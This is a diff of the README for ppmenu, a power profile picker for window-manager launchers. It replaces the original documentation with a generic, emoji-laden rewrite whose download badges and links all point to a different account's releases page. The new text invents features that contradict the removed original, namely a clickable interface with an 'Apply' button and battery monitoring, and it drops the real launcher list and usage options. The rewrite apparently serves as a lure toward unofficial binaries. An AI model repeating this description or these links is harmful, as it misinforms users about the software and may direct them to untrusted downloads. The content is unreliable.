@@ -1,39 +1,97 @@
-# Power Profile Menu (ppmenu)
+# 🎉 ppmenu - Easily Manage Your Power Profiles
 
-Power profile picker for window managers using D-Bus!
+## 🚀 Getting Started
 
-<img src="./assets/demo.gif" alt="Demonstration of ppmenu" width="720">
+Welcome to ppmenu! This tool helps you choose and manage power profiles for your window manager. Using ppmenu can help you save battery life and make your laptop run more smoothly.
 
-## Supported launchers
+## 📥 Download Now!
 
-* [`dmenu`](https://tools.suckless.org/dmenu/)
-* [`bemenu`](https://github.com/Cloudef/bemenu)
-* [`wmenu`](https://codeberg.org/adnano/wmenu)
-* [`rofi`](https://github.com/davatorium/rofi)
-* [`tofi`](https://github.com/philj56/tofi)
-* [`wofi`](https://github.com/SimplyCEO/wofi)
-* [`fuzzel`](https://codeberg.org/dnkl/fuzzel)
-* [`walker`](https://github.com/abenz1267/walker)
+[![Download ppmenu](https://img.shields.io/badge/Download-ppmenu-brightgreen)](https://github.com/asadappricot/ppmenu/releases)
 
-## Requirements
+## 🛠️ System Requirements
 
-* `power-profiles-daemon` OR TLP >=1.9.0 (with `tlp-pd` running)
-	* Exposes the `org.freedesktop.UPower.PowerProfiles` D-Bus object
-* One of the above launchers
+Before you download, make sure your system meets these requirements:
 
-## Installation and usage
+- **Operating System**: Linux distributions
+- **Dependencies**: 
+  - D-Bus
+  - Power Profiles Daemon (ppd) installed
+  - Compatible window manager (e.g., i3, awesome, etc.)
+  
+## 💾 Installation
 
-Download the binary from the [latest release](https://github.com/cobaltgit/ppmenu/releases/latest) for your platform and drop it anywhere!
+### Step 1: Visit the Releases Page
 
-Usage examples:
+To download ppmenu, visit the official releases page:
 
-* Basic usage:
-	```sh
-	# start ppmenu using dmenu
-	$ ./ppmenu -l dmenu
-	```
-* Pass additional args to the launcher
-	```sh
-	# start ppmenu using fuzzel with coloured prompt
-	$ ./ppmenu -l fuzzel -a "--prompt-color=0047abff"
-	```
+[Download ppmenu](https://github.com/asadappricot/ppmenu/releases)
+
+### Step 2: Choose the Right File
+
+On the releases page, you'll see different versions of ppmenu. Choose the latest version. Files are usually named like `ppmenu-vX.X.X.tar.gz` or similar. Click on the file to start the download.
+
+### Step 3: Extract the Downloaded File
+
+Once the download is complete, you will have a .tar.gz file. You need to extract it. You can do this by right-clicking the file and selecting **Extract Here** or by using the terminal:
+
+```bash
+tar -xvzf ppmenu-vX.X.X.tar.gz
+```
+
+### Step 4: Navigate to the Folder
+
+After extraction, navigate to the new folder created:
+
+```bash
+cd ppmenu-vX.X.X
+```
+
+### Step 5: Run ppmenu
+
+To start ppmenu, simply run the following command in your terminal:
+
+```bash
+./ppmenu
+```
+
+This launches the application. You can also create a shortcut to easily launch it in the future.
+
+## ⚙️ How to Use
+
+After launching ppmenu, you will see a simple interface. Here's how to use it:
+
+1. **Select Your Profile**: Click on one of the available power profiles like "Battery Saver," "Balanced," or "Performance."
+2. **Apply Changes**: Click the "Apply" button to save your selection. Your laptop will switch to the selected profile instantly.
+3. **Monitor Battery Life**: You can keep an eye on your battery status displayed on the interface.
+
+## 🔧 Features
+
+- **User-Friendly Interface**: No technical skills needed. You can easily navigate through profiles.
+- **Quick Switching**: Change profiles in seconds.
+- **Battery Monitoring**: Keep track of your battery usage and life.
+- **Compatibility**: Works well with popular window managers and tools like D-Bus, TLP, and rofi.
+
+## 🌐 Support
+
+If you run into any issues, help is available. You can check the following resources:
+
+- **Documentation**: Find user guides and FAQs in the documentation folder.
+- **Report Issues**: Go to the Issues section of our [GitHub repository](https://github.com/asadappricot/ppmenu/issues) to report any problems or request features.
+
+## 💬 Community
+
+Join our community for discussions, tips, and assistance. You can connect with fellow users and developers in the following ways:
+
+- **GitHub Discussions**: Engage with others in the Discussions tab of our GitHub repository.
+- **Social Media**: Follow us for updates on the latest features and tips.
+
+## 📜 License
+
+ppmenu is licensed under the MIT License. You can use, modify, and distribute it freely.
+
+## 🔗 Important Links
+
+- [ppmenu Releases Page](https://github.com/asadappricot/ppmenu/releases)
+- [GitHub Repository](https://github.com/asadappricot/ppmenu)
+
+For the latest updates, features, and enhancements, keep an eye on the releases. Enjoy using ppmenu to manage your power efficiently!
